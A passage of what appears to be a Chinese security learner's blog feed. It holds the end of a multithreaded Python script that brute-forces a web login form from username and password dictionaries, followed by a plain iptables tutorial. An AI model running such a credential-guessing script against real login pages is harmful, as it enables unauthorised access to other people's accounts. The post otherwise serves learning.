class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--timeout&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, metavar=<span class="string">&quot;5&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;设置超时时间&quot;</span>, default=<span class="number">5</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">username = get_data(args.username)</span><br><span class="line">password = get_data(args.password)</span><br><span class="line">timeout = args.timeout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 探活</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url, timeout</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, timeout=timeout)</span><br><span class="line">        logger.info(<span class="string">f&quot;响应状态码：<span class="subst">&#123;response.status_code&#125;</span> -----&gt; <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> response.status_code</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        logger.error(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">username, password, url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            success_results.append(<span class="string">f&quot;[+]爆破成功：用户名：<span class="subst">&#123;username&#125;</span>，密码：<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            logger.info(success_results[-<span class="number">1</span>])  <span class="comment"># 记录成功的日志信息</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     logger.debug(f&quot;[-]爆破失败：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        logger.info(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>, 测试数据: username:<span class="subst">&#123;username&#125;</span>, password <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多线程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi_thread</span>(<span class="params">username, password, url, timeout</span>):</span><br><span class="line">    <span class="keyword">if</span> check(url, timeout) != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> password:</span><br><span class="line">            threads.append(threading.Thread(target=run, args=(i, j, url,)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.start()</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    logger.info(<span class="string">&quot;运行结束&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出成功的结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;成功的结果:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> success_results:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    multi_thread(username, password, url, timeout)</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240720220123972.png" alt="image-20240720220123972"></p><p>可以看到终极版的输出，有成功和请求失败的，对于多线程导致的请求失败的结果哦我们可以单独再测试一次。。。吃了不会多线程的苦，检查下日志</p><p><img src="/../image/image-20240720220335586.png" alt="image-20240720220335586"></p><p>对于请求失败的测试结果和成功的结果都有区分，然后命名也不会太长</p><h2 id="挖坑总结"><a href="#挖坑总结" class="headerlink" title="挖坑总结"></a>挖坑总结</h2><ol><li>这只是对当个url的测试</li><li>没有爬虫</li><li>没有token，session，cookie</li><li>没有验证码绕过</li><li>好累</li><li>把BP用好比啥都强，还是学BP的爆破容易一点</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>iptables</title>
      <link href="/2024/05/31/iptables/"/>
      <url>/2024/05/31/iptables/</url>
      
        <content type="html"><![CDATA[<h1 id="基础模型与参数介绍"><a href="#基础模型与参数介绍" class="headerlink" title="基础模型与参数介绍"></a>基础模型与参数介绍</h1><h2 id="什么是防火墙-防火墙的分类有哪些？"><a href="#什么是防火墙-防火墙的分类有哪些？" class="headerlink" title="什么是防火墙?防火墙的分类有哪些？"></a>什么是防火墙?防火墙的分类有哪些？</h2><p>防火墙技术是通过有机结合各类用于安全管理与筛选的软件和硬件设备，帮助计算机网络于其内、外网之间构建一道相对隔绝的保护屏障，以保护用户资料与信息安全性的一种技术。</p><p>防火墙对流经它（进出）的网络通信进行扫描，这样能够过滤掉一些攻击，以免其在目标计算机上被执行。防火墙还可以关闭不使用的端口。而且它还能禁止特定端口的流出通信，封锁特洛伊木马。最后，它可以禁止来自特殊站点的访问，从而防止来自不明入侵者的所有通信。</p><p>一般情况下，防火墙分类：</p><p>从逻辑上防火墙可以大体分为主机防火墙和网络防火墙。</p><p>主机防火墙：针对于单个主机进行防护。</p><p>网络防火墙：针对于多个主机组成的网络进行防护。往往处于需要被保护的网络入口或边缘，对网络入口进行防护，服务于防火墙背后的本地局域网。</p><p>从物理上防火墙可以分为硬件防火墙和软件防火墙。</p><p>硬件防火墙：在硬件级别实现部分防火墙功能，另一部分功能基于软件实现，性能高，成本高。</p><p>软件防火墙：应用软件处理逻辑运行于通用硬件平台之上的防火墙，性能低，成本低，比如我们常见的windows自带防火墙，就属软件防火墙。</p><p><a href="https://blog.csdn.net/m0_52165864/article/details/126987346">什么是网络边界</a></p><h2 id="什么是iptables？"><a href="#什么是iptables？" class="headerlink" title="什么是iptables？"></a>什么是iptables？</h2><p>​iptables 是与 3.5及以后版本 Linux 内核集成的 IP 信息包过滤系统。一般我们称iptables是防火墙，理解为linux上的软件防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，一般内置在Centos与RedHat中。但是在在RHEL7系统中，firewalld防火墙取代了iptables防火墙，Centos7中的默认防火墙也是firewalld，如果想要在Centos7系统中使用iptables，需要安装。</p><p>iptables可以根据数据包中的地址、端口、协议、状态、资源、内容等信息，对数据包进行过滤，并采取相应的处理措施。</p><p>​但是从严格意义来讲，<strong>iptables</strong>其实不是真正的防火墙，他的全称应该是“netfilter&#x2F;iptables IP 数据包过滤系统”，由两个组件netfilter 和 iptables 组成。我们可以把它理解成一个客户端代理，用户通过iptables这个代理，将用户的安全设定执行到对应的”安全框架”中，这个”安全框架”才是真正的防火墙，这个框架的名字叫<strong>netfilter。</strong>位于内核空间。而iptables位于用户空间，是一个命令行工具，我们用这个工具操作netfilter，习惯上将两者组合起来称iptables防火墙。</p><p>Netfilter是Linux操作系统核心层内部的一个数据包处理模块，它具有如下功能：</p><p>网络地址转换(Network Address Translate)</p><p>数据包内容修改</p><p>以及数据包过滤的防火墙功能</p><p>所以说，虽然我们使用service iptables start启动iptables”服务”，但是其实准确的来说，iptables并没有一个守护进程，所以并不能算是真正意义上的服务，而应该算是内核提供的功能。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>防火墙主机：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统类别：Centos 7.3</span><br><span class="line">内核版本：3.10.0-693.el7.x86_64</span><br><span class="line">操作软件：iptables v1.4.21</span><br><span class="line">IP 地址：192.168.0.2</span><br></pre></td></tr></table></figure><p>客户端主机：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统类别：Kali Linux 2020.1</span><br><span class="line">内核版本：5.5.0-kali2-amd64</span><br><span class="line">IP地 址：192.168.0.4</span><br></pre></td></tr></table></figure><p>本次实验共分为三个部分</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. iptables基础模型与概念介绍</span><br><span class="line">2. iptables基础使用方式</span><br><span class="line">3. iptables参数解释</span><br></pre></td></tr></table></figure><h3 id="iptables基础模型与概念介绍"><a href="#iptables基础模型与概念介绍" class="headerlink" title="iptables基础模型与概念介绍"></a>iptables基础模型与概念介绍</h3><p>iptables是由链、表和规则三个元素组成。</p><p>表是链的容器，链是规则的容器。他们三个之间的关系，我们下面细讲。</p><h4 id="什么是规则？"><a href="#什么是规则？" class="headerlink" title="什么是规则？"></a><strong>什么是规则？</strong></h4><p>规则是iptables面对不同网络报文时采取行动的依据，即iptables是按照规则来办事的。iptables根据规则中指定的匹配条件来尝试匹配每个流经此处的报文，一旦匹配成功，则由规则后面指定的处理动作进行处理；</p><p>规则就像是学校的纪律、公司的规章制度一样。是由网络管理员预定义的针对流经防火墙的网络数据包的一条或一系列的约束条件，一般可以将其格式理解为：“如果接收到的数据包头符合设定的条件，就按照设定的处理方式来处理这个数据包”。</p><p>规则存储在内核空间的信息包过滤表中，这些规则可以指定源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）等。当数据包的某些字段与某条规则指定的所有条件匹配时，iptables就根据规则所定义的处理动作来处理这些数据包，如放行（accept）、拒绝（reject）和丢弃（drop）等。</p><p>配置防火墙的主要工作就是添加、修改和删除这些规则。</p><h4 id="什么是链？"><a href="#什么是链？" class="headerlink" title="什么是链？"></a><strong>什么是链？</strong></h4><p>我们知道，防火墙是根据规则办事的，而规则是一条一条的，根据每一条规则应用场景的不同，可以将这些规则进行分类，每一个分类中按顺序排列着多条规则，像一条链子，所以，这些规则所分成的类，就是我们所说的链。</p><p>当防火墙按照该条链上的规则对网络报文进行匹配的时候，是依次、按照顺序进行匹配，直到找到一条规则能够对该网络报文进行处理，或是直到这条链所有的规则都匹配完，没有匹配到合适的规则，采用默认规则进行处理。</p><p>iptables内置了5条链：PREROUTING链、FORWARD链、POSTROUTING链、INPUT链、OUTPUT链</p><p>PREROUTING： 路由前链，应用于对数据包进行路由选择前，即在网卡刚接收到网络报文时；</p><p>FORWARD：转发链，其作用是将数据包由一个网卡转发至另一个网卡；</p><p>POSTROUTING：路由选择之后所应用的链，应用于防火墙向其他主机转发网络报文时，可对报文进行重新封装；</p><p>INPUT：路由选择后所应用的链，应用于网络报文的目的是防火墙本机的上层应用时，即内核空间的TCP&#x2F;IP协议栈将报文传给用户空间的上层应用时使用的链；</p><p>OUTPUT：防火墙用户空间的上层应用向内核空间的TCP&#x2F;IP协议栈转发报文时使用的链；</p><p>我们用如下图进行一个解析：</p><p>（只是将网络流量流经防火墙时可能用到的链，及使用该链时流量的走向标了出来，并不是说流量完全按照下图表示的方向进行传送，具体情境具体分析）</p><p><img src="/../image/image-20240531155402251.png" alt="image-20240531155402251"></p><p>情境1： 网络1中的主机，访问网络2中的某个主机。</p><p>① 网络流量到达网卡eth1后，防火墙进行PREROUTING链的规则匹配，如果通过，则进入下一步</p><p>② 网络流量经过TCP&#x2F;IP协议栈，进行路由选择。</p><p>③ 由于目的地址是网络2中的主机，所以TCP&#x2F;IP协议栈需要将流量从网卡eth1转发到网卡eth0，防火前在此时进行FORWARD链的规则匹配</p><p>④ 防火墙进行POSTROUTING链的规则匹配，对流量进行重新封装，经由网卡eth0发送给网络2中的主机</p><p>⑤ 网络2中主机的响应流量，与前面的请求流量的路径差不多，eth0 –&gt; PREROUTING链 –&gt; TCP&#x2F;IP协议栈 –&gt; FORWARD链 –&gt; POSTROUTING链 –&gt; eth1</p><p>情境2： 网络1中的主机，访问防火墙本机上层的一个应用。</p><p>① 网络流量到达网卡eth1后，防火墙进行PREROUTING链的规则匹配，如果通过，则进入下一步</p><p>② 网络流量经过TCP&#x2F;IP协议栈，进行路由选择。</p><p>③ 由于目的地址是防火墙本机的上层应用，所以TCP&#x2F;IP协议栈向上层服务转发流量，防火墙进行INPUT链的规则匹配</p><p>④ 上层服务在处理完流量后，给与回应，防火墙进行OUTPUT链的规则匹配</p><p>⑤ 流量经过TCP&#x2F;IP协议栈，进行路由选择后，TCP&#x2F;IP协议栈将流量向网卡eth1转发</p><p>⑥ 防火墙进行POSTROUTING链的规则匹配，对流量报文进行重新封装后，经由网卡eth1发送给网络1</p><p>经过上面两个情境的分析，我们就可以知道防火墙中，链是如何运作的，也可以总结出更为准确的流程图：</p><p><img src="/../image/image-20240531163716824.png" alt="image-20240531163716824"></p><h4 id="什么是表"><a href="#什么是表" class="headerlink" title="什么是表"></a>什么是表</h4><p>表与链不同，表是根据规则功能的不同而进行的分类，把这些实现相同功能的规则放在一起形成一个分类，这个分类就叫做表。比如将都是对IP或者端口进行过滤过滤的规则分为一类。</p><p>不同功能的规则，我们可以放置在不同的表中进行管理，而iptables中默认有4种表，每种表对应了不同的功能，而我们所能定义的规则也基本都在这4种功能的范围之内，具体如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter表：负责过滤功能，实现对数据包的过滤，起到真正的安全效果。</span><br><span class="line"></span><br><span class="line">nat表：network address translation，网络地址转换功能，不能过滤数据包，仅仅是修改数据包中的IP和端口，即重新封装数据包</span><br><span class="line"></span><br><span class="line">mangle表：拆解报文，做出修改，并重新封装的功能，不能过滤，也不能修改IP和端口，其修改的功能是指根据规则修改数据包的隐写标志位，比如TTL、TOS值，以便其他规则或程序可以根据这个标志来对数据包进行过滤或策略路由。</span><br><span class="line"></span><br><span class="line">raw表：关闭nat表上启用的连接追踪机制。可以决定是否使用iptables对数据包进行跟踪处理，比如访问量很大的web服务80端口，就可以在raw表中设置规则，让iptables不对80端口的数据包进行链接追踪处理，以此来提高性能。</span><br></pre></td></tr></table></figure><p>当然，iptables也支持我们定义自己的表。</p><h4 id="表链关系"><a href="#表链关系" class="headerlink" title="表链关系"></a>表链关系</h4><p>我们一开始说，表是链的容器，链是规则的容器，那么他们三个之间的关系究竟是怎样的？可以用如下图简单的表示：</p><p><img src="/../image/image-20240531163813771.png" alt="image-20240531163813771"></p><p>prerouting链上所能配置的规则，只拥有nat表、raw表和mangle表所对应的功能，所以，prerouting中的规则只能存放于nat表、raw表和mangle表中。也就是说，不是每个表中都包含所有的链。</p><p>他们之间的关系如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">raw 表包含的链：PREROUTING，OUTPUT</span><br><span class="line"></span><br><span class="line">mangle 表包含的链：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</span><br><span class="line"></span><br><span class="line">nat 表包含的链：PREROUTING，OUTPUT，POSTROUTING（centos7中还有INPUT，centos6中没有）</span><br><span class="line"></span><br><span class="line">filter 表中包含的链：INPUT，FORWARD，OUTPUT</span><br></pre></td></tr></table></figure><p>到这里，我们还需要注意一点，就是优先级的问题，iptables中，在数据包经过一个”链”的时候，会将当前链的所有规则都匹配一遍，但是匹配时总归要有顺序，又因为相同功能类型的规则会汇聚在一张”表”中，所以这里“优先级”的主题，就是“表”。总结为一下就是“哪些”表”中的规则会放在”链”的最前面执行？”</p><p>当iptables中的4种表处于同一条”链”时，执行的优先级为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">raw –&gt; mangle –&gt; nat –&gt; filter</span><br></pre></td></tr></table></figure><h4 id="iptables防火墙的工作模型"><a href="#iptables防火墙的工作模型" class="headerlink" title="iptables防火墙的工作模型"></a>iptables防火墙的工作模型</h4><p>结合上述所有的描述，我们可以将数据包通过防火墙的流程总结为下图：</p><p><img src="/../image/image-20240531164122244.png" alt="image-20240531164122244"></p><h4 id="规则的组成"><a href="#规则的组成" class="headerlink" title="规则的组成"></a><strong>规则的组成</strong></h4><p>规则由匹配条件和处理动作组成。</p><h4 id="匹配条件"><a href="#匹配条件" class="headerlink" title="匹配条件"></a>匹配条件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">匹配条件分为基本匹配条件与扩展匹配条件</span><br></pre></td></tr></table></figure><h4 id="基本匹配条件："><a href="#基本匹配条件：" class="headerlink" title="基本匹配条件："></a><strong>基本匹配条件：</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">源地址Source IP；</span><br><span class="line">目标地址 Destination IP；</span><br><span class="line">协议类型 protocol；</span><br><span class="line">网卡接口 ；</span><br><span class="line">等。</span><br></pre></td></tr></table></figure><h4 id="扩展匹配条件："><a href="#扩展匹配条件：" class="headerlink" title="扩展匹配条件："></a><strong>扩展匹配条件：</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">除了上述的条件可以用于匹配，还有很多其他的条件可以用于匹配，这些条件泛称为扩展条件，这些扩展条件其实也是netfilter中的一部分，只是以模块的形式存在，如果想要使用这些条件，则需要依赖对应的扩展模块。如：</span><br><span class="line">MAC地址；</span><br><span class="line">字符串；</span><br><span class="line">多个源/目的端口；</span><br><span class="line">时间；</span><br><span class="line">等</span><br></pre></td></tr></table></figure><h4 id="处理动作"><a href="#处理动作" class="headerlink" title="处理动作"></a><strong>处理动作</strong></h4><p>处理动作也可以分为基本动作和扩展动作。</p><p>常用的处理动作有：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ACCEPT：允许数据包通过。</span><br><span class="line">DROP：直接丢弃数据包，不给任何回应信息，这时候客户端会感觉自己的请求泥牛入海了，过了超时时间才会有反应。</span><br><span class="line">REJECT：拒绝数据包通过，必要时会给数据发送端一个响应的信息，客户端刚请求就会收到拒绝的信息。</span><br><span class="line">SNAT：源地址转换，解决内网用户用同一个公网地址上网的问题。</span><br><span class="line">MASQUERADE：是SNAT的一种特殊形式，适用于动态的、临时会变的ip上。</span><br><span class="line">DNAT：目标地址转换。</span><br><span class="line">REDIRECT：在本机做端口映射。</span><br><span class="line">LOG：在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则，也就是说除了记录以外不对数据包做任何其他操作，仍然让下一条规则去匹配。</span><br></pre></td></tr></table></figure><h3 id="iptables基础使用方式"><a href="#iptables基础使用方式" class="headerlink" title="iptables基础使用方式"></a>iptables基础使用方式</h3><p><strong>如何在centos中查看iptables是否启动？</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用 “service iptables  status” 查看防火墙的状态</span><br></pre></td></tr></table></figure><p>如图，绿色的active表示防火墙处于激活状态，即正在运行中。</p><p><img src="/../image/image-20240531164316414.png" alt="image-20240531164316414"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用“service iptables stop” 关闭防火墙</span><br></pre></td></tr></table></figure><p><strong>怎样查看表中的规则？比如查看filter表中的规则</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用 “iptables -t filter -L” 将iptables表的内容展示出来</span><br></pre></td></tr></table></figure><p>如上命令中，-t表示指定查看哪个表的规则，-L 表示将结果列出来。</p><p>如下图所示，iptables会返回filter表中存在的各个链（INPUT、FORWARD、OUTPUT）以及链中存在的规则</p><p><img src="/../image/image-20240531165325541.png" alt="image-20240531165325541"></p><p>其实上列中的命令可以使用 “iptables -L” 来代替，因为filter表是iptables的默认表，在不使用-t参数指定表名的情况下，默认是对filter进行操作。</p><p>我们也可以查看其它表中的规则，示例如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -t raw -L</span><br><span class="line">iptables -t mangle -L</span><br><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure><p><strong>如何查看指定表中的指定链的规则？</strong></p><p>比如，我们只查看filter表中INPUT链的规则，示例如下（注意链名的大小写）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -L INPUT //-t filter被省略</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240531165425661.png" alt="image-20240531165425661"></p><p>可以看到，使用-v选项后，iptables展示的信息更多了，多出了很多原来没有的字段，这些字段就是规则对应的属性。具体如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pkts:对应规则匹配到的报文的个数。</span><br><span class="line"></span><br><span class="line">bytes:对应匹配到的报文包的大小总和。</span><br><span class="line"></span><br><span class="line">target:规则对应的target，往往表示规则对应的”动作”，即规则匹配成功后需要采取的措施。</span><br><span class="line"></span><br><span class="line">prot:protocol的简写，表示规则对应的协议，是否只针对某些协议应用此规则。</span><br><span class="line"></span><br><span class="line">opt:表示规则对应的选项。</span><br><span class="line"></span><br><span class="line">in:表示数据包由哪个接口(网卡)流入，我们可以设置通过哪块网卡流入的报文需要匹配当前规则。</span><br><span class="line"></span><br><span class="line">out:表示数据包由哪个接口(网卡)流出，我们可以设置通过哪块网卡流出的报文需要匹配当前规则。</span><br><span class="line"></span><br><span class="line">source:表示规则对应的源头地址，可以是一个IP，也可以是一个网段。</span><br><span class="line"></span><br><span class="line">destination:表示规则对应的目标地址。可以是一个IP，也可以是一个网段。anywhere是iptables默认对IP地址进行了名称解析，如果规则较多的情况下，会降低iptables的工作效率，可以使用-n参数表示不对名称进行反解，直接显示IP地址。</span><br></pre></td></tr></table></figure><p><strong>使用-n参数不对名称进行反解</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -vnL INPUT</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240531165520132.png" alt="image-20240531165520132"></p><p><strong>使用–line-numberc 显示规则的序号</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables --line-number -vnL INPUT</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240531165550757.png" alt="image-20240531165550757"></p><p>如果觉得 –line-number 比较长，也可以使用–line：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables --line -vnL INPUT</span><br></pre></td></tr></table></figure><p><strong>默认策略</strong></p><p>每条链都有自己的默认策略，如何查看默认策略？默认策略的表述就在每个链后面的括号里：</p><p><strong>policy</strong>表示当前链的默认策略，policy ACCEPT表示上图中INPUT的链的默认动作为ACCEPT，换句话说就是，当没有没有匹配到相应的规则时，默认接受通过INPUT链的所有请求。</p><p><strong>packets</strong>表示当前链（上例为INPUT链）默认策略匹配到的包的数量，0 packets表示默认策略匹配到0个包。</p><p><strong>bytes</strong>表示当前链默认策略匹配到的所有包的大小总和。</p><p>其实，我们可以把packets与bytes称作”计数器”，上图中的计数器记录了默认策略匹配到的报文数量与总大小，”计数器”只会在使用-v选项时，才会显示出来。</p><p>当被匹配到的包达到一定数量时，计数器会自动将匹配到的包的大小转换为可读性较高的单位。如果想要查看精确的计数值，可以使用-x参数。</p><p>可以使用如下命令来修改默认规则（可以尝试修改其他链的默认规则，修改INPUT的默认规则，可能导致远程连接的断开）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -P INPUT DROP //将filter表的INPUT链的默认规则更改为DROP</span><br></pre></td></tr></table></figure><h3 id="iptables参数解释"><a href="#iptables参数解释" class="headerlink" title="iptables参数解释"></a>iptables参数解释</h3><p>现在开始详细了解iptables的语法和部分参数。</p><p>使用man命令查看帮助信息：</p><p><img src="/../image/image-20240531165843715.png" alt="image-20240531165843715"></p><p>如上图，使用man命令查看之后，列出了iptables的大多数参数的使用示例。可总结出iptables的使用语法：</p><p>格式：iptables [-t 表名] COMMAND 链名 [规则序号] 匹配条件 -j 执行操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[-t 表名]： 表示该项可省略，省略该参数的情况下，默认是对filter表进行操作。</span><br><span class="line">COMMAND：要执行的命令，比如添加、删除、修改、替换规则。</span><br><span class="line">[规则序号]：规则序号就是对该链下的第几条规则进行操作，如果省略的话，默认是对最后一条规则进行操作。</span><br><span class="line">匹配条件： 对什么样的数据包进行匹配</span><br><span class="line">执行操作： 对匹配到的数据包执行的操作，比如ACCEPT（接受）、DROP（丢弃）、REJECT（拒绝）</span><br></pre></td></tr></table></figure><p>接下来我们详细介绍部分COMMAND常用参数的作用，如下图</p><p>例如： -A 表示短项，–append表示长项，使用的时候选其一即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-A --append 链名 ：在指定的链中追加规则，一般是在末尾追加。</span><br><span class="line">-I --insert 链名 [规则序号num]：在指定的链中插入规则，默认是在首部插入，可指定位置。</span><br><span class="line">-D --delete 链名 [规则序号num]：删除指定链中的指定规则，默认是删除最后一个，可指定位置。</span><br><span class="line">-R --replace 链名 [规则序号num]：替换规则，可指定位置。</span><br><span class="line">-F --flush [链名] ：清除指定链中的规则，如果没有指定链名的话，则默认是清除指定表中的所有链下的规则。</span><br><span class="line">-N --new-chain 链名：除自有的5条链之外，还可使用该参数创建新的链。</span><br><span class="line">-X --delete-chain 链名：删除自定义的链。但是链必须是在空链的状态下。</span><br><span class="line">-Z --zero 链名：将指定链的计数器置零。</span><br><span class="line">-P --policy 链名：修改指定链的默认策略。</span><br><span class="line">-L --list ：显示iptables中的规则列表。这个参数，我们在上面的章节中已经接触过了，它还有几个可以结合使用的参数：</span><br><span class="line">  -n ： 使用数字显示，如果不加该参数，iptables会将数字反解为服务名，当规则数量较多时，会影响iptables的效率，速度会变慢，所以一般情况下要添加该参数。</span><br><span class="line">  -v ： 显示规则的详细信息，包阔每一个规则的计数器。</span><br><span class="line">  --line：显示规则的时候，在规则的前面显示序号。</span><br></pre></td></tr></table></figure><p>那么上面的是COMMAND部分的常用参数，那么在匹配条件部分也有一些常用的参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p --protocol 协议：指定需要匹配的目标协议，比如tcp、icmp、http等</span><br><span class="line">-s --source 地址：指定需要匹配的源地址</span><br><span class="line">-d --destination 地址：指定需要匹配的目标地址</span><br><span class="line">-i --in-interface 名称：指定网络流量包流入的网卡，即对流入该网卡的流量包进行匹配</span><br><span class="line">-o --out-interface 名称：指定网络流量包流出的网卡，即对流出该网卡的流量包进行匹配</span><br></pre></td></tr></table></figure><p>我们可以使用几个例子来练习一下这些参数的使用：</p><p>假设我们现在要进行的规则匹配，是其他主机对防火墙本机的请求流量，所以我们需要对INPUT链进行规则的添加：</p><p>我们先查看INPUT现有的规则：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -L INPUT -n --line</span><br></pre></td></tr></table></figure><p>假设我们现在要禁止别的主机对本机进行ping探测，所以要配置一个icmp协议相关的规则，并且其采用的处理方式是拒绝。</p><p>所以我们看上图中的规则，发现第二条规则是跟icmp协议相关的规则，但是其处理方式是ACCEPT接受。这样的话，如果有ping探测包到达本机的时候，进行规则的匹配，等匹配到第二条规则的时候，就会直接通过，不会再匹配到我们新的规则。</p><p>我们可以做如下测试：</p><p>先添加规则：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p icmp -s 192.168.0.4 -j DROP</span><br></pre></td></tr></table></figure><p>查看规则，可以看见现在有两条跟icmp相关的规则（此处的情况在不同人的实验环境中，可能会有不同）：</p><p>然后我们使用kali对本机进行ping探测：</p><p>发现可以正常探测，说明我们刚刚添加的拒绝规则没有起到效果。我们删除第二条规则：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -D INPUT 2</span><br></pre></td></tr></table></figure><p>发现可以正常探测，说明我们刚刚添加的拒绝规则没有起到效果。我们删除第二条规则：</p><p><img src="/../image/image-20240531170806691.png" alt="image-20240531170806691"></p><p><img src="/../image/image-20240531170810715.png" alt="image-20240531170810715"></p><p>清空规则，只是清空了系统加载在内存中的规则，并没有保存。所以如果要使添加的规则不在重启后消失，需要保存。</p><p>可以使用如下命令进行保存</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service iptables save  或者 iptables-save &gt; /etc/sysconfig/iptables</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-tar</title>
      <link href="/2024/05/30/linux-tar/"/>
      <url>/2024/05/30/linux-tar/</url>
      
